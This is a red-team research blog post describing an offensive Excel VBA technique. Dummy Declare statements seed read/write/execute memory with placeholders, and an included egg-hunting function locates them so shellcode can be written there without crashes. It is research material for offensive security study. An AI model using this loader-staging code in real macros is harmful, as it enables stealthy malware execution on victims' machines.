---
title: "VBA: overwriting R/W/X memory in a reliable way"
date: 2024-07-07 00:00:00 +00:00
modified: 2024-07-07 00:00:00 +00:00
tags: [red team, research, VBA, macros, X-C3LL]
description: Finding a way to reuse R/W/X memory with VBA and how to avoid crashes
image: 
---


Dear Fell**owl**ship, today's homily is an addendum to our previous homily "[VBA: having fun with macros, overwritten pointers & R/W/X memory](https://adepts.of0x.cc/vba-hijack-pointers-rwa/)". After writing the previous post our owls met in a parliament to deliberate how to add stability to the technique shown. After a few exchanges of ideas lubricated by the consecrated wine, the solution was found. This solution was presented to the public during the [EuskalHack VII](https://github.com/X-C3LL/congresos-slides/blob/master/Offensive%20VBA.pdf) conclave.

# Prayers at the foot of the Altar a.k.a. disclaimer
*I am writing this article after EuskalHack VII as an addedum to my previous post on this topic. When I presented this technique on this blog I did not have a reliable way to find a place where to place the shellcode, but weeks after I found a solution. In this short article I describe this solution to make the technique 100% reliable.*

# A quick recap

If you remember our article "[VBA: having fun with macros, overwritten pointers & R/W/X memory](https://adepts.of0x.cc/vba-hijack-pointers-rwa/)" we executed our shellcode by just using a primitive to move memory from point A to point B, so we could overwrite a pointer that would let us hijack the natural program flow and jump to our shellcode. Also we found that VBA is a sinner does nasty things like this:

```c
1800eec9c  long UpdatePageProtection(void* __ptr64 arg1, unsigned long arg2)

1800eecad      enum WIN32_ERROR var_10 = NO_ERROR
1800eecd3      void var_c
1800eecd3      if (VirtualProtect(lpAddress: arg1, dwSize: zx.q(arg2), flNewProtect: PAGE_EXECUTE_READWRITE, lpflOldProtect: &var_c) == 0)
1800eecd5          enum WIN32_ERROR rax_2 = GetLastError()
1800eece4          enum WIN32_ERROR var_14_1
1800eece4          if (rax_2 s> NO_ERROR)
1800eed02              var_14_1 = zx.d(rax_2.w) | 0x70000 | 0x80000000
1800eecea          else
1800eecea              var_14_1 = rax_2
1800eed0a          var_10 = var_14_1
1800eed17      return var_10
```

This little Eden is eager to be colonised by our shellcode, where it can enjoy a peaceful life. The problem is that in reality it is an illusion: this land is extremely unstable. In general, there are two problems:
1. This memory region is continously being overwritten, so by the moment we jump to it maybe the shellcode was corrupted or totally wiped.
2. This memory region cotains data that is used by Excel, so if we overwrite something useful... it would end in a crash.

# Finding an oasis in the desert

In VBA a **Declare** sentence is only "executed" when the macro calls to that function/sub. This means we can have fake **Declare** for exports that does not exists and it is not going to return any error as long as we do not call that function. For example:
```vb
Private Declare PtrSafe Function ajjj13371337AdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdeptAdept Lib "KERNEL32" () As LongPtr
```

The magic happens when we discover that this string is present in the R/W/X memory region:

<figure>
<img src="/VBA-RWX-ADDENDUM/rwx.png" alt="Attacker controlled string placed at RWX memory"> 
<figcaption>
Attacker controlled string placed at RWX memory
</figcaption>
</figure>

This means that we can use this trick to seed the R/W/X memory region with placeholders (~250 bytes) that can be overwritten with a small loader divided in chunks! To find the placeholders we can add a small "tag" (one different for each placeholder) as prefix and then search for it (classic egg hunting technique).
```vb
Function findEgg() As LongPtr
    Dim mbi As MEMORY_BASIC_INFORMATION
    Dim ret As LongPtr
    Dim dwLenght As LongPtr
    Dim j As Long
    Dim check As Long
    Dim found As Integer
    found = 0
    j = 1
    For i = 0 To 500000
        ret = VirtualQuery(addr, mbi, LenB(mbi))
        If mbi.Protect = 64 Then
		For k = 0 To mbi.RegionSize - 4 Step 1
                Call CopyMemory(VarPtr(check), mbi.BaseAddress + k, 4)
                If check = 926102321 Then '1337
                    findEgg = mbi.BaseAddress + k
                    found = 1
                    Exit For
                End If
            Next k
            If found = 1 Then
                Exit For
            End If
        End If
        addr = mbi.BaseAddress + mbi.RegionSize
    Next i
End Function
```

# EoF

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).


